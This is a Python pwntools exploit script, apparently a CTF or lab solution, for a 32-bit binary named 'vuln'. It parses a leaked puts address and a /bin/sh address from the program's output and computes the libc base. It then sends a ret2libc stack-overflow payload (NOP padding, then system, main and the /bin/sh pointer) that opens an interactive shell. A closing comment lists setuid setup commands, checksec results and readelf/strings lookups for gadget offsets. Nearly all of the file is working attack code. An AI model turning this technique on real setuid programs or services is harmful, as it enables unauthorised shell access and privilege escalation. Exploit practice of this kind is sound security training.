#!/usr/bin/env python3

from pwn import *

exe = './vuln'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

libc = ELF('/lib32/libc.so.6',checksec=False)

#host,port = '',

p = process(exe)
#p = remote(host,port)

puts_offset = libc.symbols.puts#since libc.address not assigned yet so libc.symbols.puts dosent give the absolute address of 'puts' but its offset

print(p.recvuntil(b':'))
print(p.recvuntil(b':'))
LEAK = int(p.recvuntil(b'\n'),16)

info("LEAK value: %x",LEAK)
bin_sh = int(p.recvuntil(b'\nEnter').decode().split(':')[3].strip().split('\n')[0],16)

info("bin/sh value: %x",bin_sh)

libc.address = LEAK - puts_offset

padding = 160

payload = flat(
    asm('nop')*padding,#padding to reach EIP
    libc.symbols.system, # since libc.address has been provided, this is the absolute address of system and not its offset
    elf.symbols.main, # return address of system
    bin_sh,
)

p.sendlineafter(b'a string:\n',payload)
p.interactive()

'''
sudo chmod 4655 vuln
sudo chmod 600 flag.txt

For binary 
Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

For Libc
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

    readelf -s /lib32/libc.so.6 | grep system
  1119: 0004c830    55 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.0
So offset of system in LibC is 0004c830

strings /lib32/libc.so.6 -t x -a | grep "bin"
1b5fc8 /bin/sh

'''
